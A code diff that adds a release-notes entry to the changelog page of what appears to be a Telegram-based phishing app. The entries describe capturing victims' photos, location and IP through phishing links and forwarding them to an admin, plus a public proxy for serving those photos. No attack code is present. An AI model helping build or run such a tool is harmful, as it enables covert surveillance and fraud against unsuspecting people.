@@ -4,7 +4,7 @@ import { Separator } from "@/components/ui/separator";
 import {
   Rocket, Bug, Shield, Zap, Star, Globe, Users,
   CreditCard, MessageCircle, ShieldCheck, Music2,
-  Activity, Wrench, Eye,
+  Activity, Wrench, Eye, Camera,
 } from "lucide-react";
 
 type VersionEntry = {
@@ -228,6 +228,20 @@ const versions: VersionEntry[] = [
       { type: "added", text: "Captures sent to admin via Bot API (photos + location + IP)" },
       { type: "added", text: "Capture viewer — browse photos, locations, IPs per link" },
       { type: "added", text: "Telegram ID capture for Mini App links" },
+    ],
+  },
+  {
+    version: "2.3.2",
+    date: "Mar 2026",
+    title: "Photo Capture & Deployment Fix",
+    icon: Camera,
+    color: "text-blue-400",
+    changes: [
+      { type: "improved", text: "Phishing capture photos now stored via Bot API file_id for reliable display" },
+      { type: "added", text: "Public /file/:fileId proxy endpoint for serving Bot API photos" },
+      { type: "added", text: "AuthImage component for legacy captures using auth headers" },
+      { type: "fixed", text: "Blank screen caused by incorrect asset path resolution on Cloudflare Pages" },
+      { type: "fixed", text: "Mini App now served from default Pages domain instead of custom domain" },
     ],
   },
   {
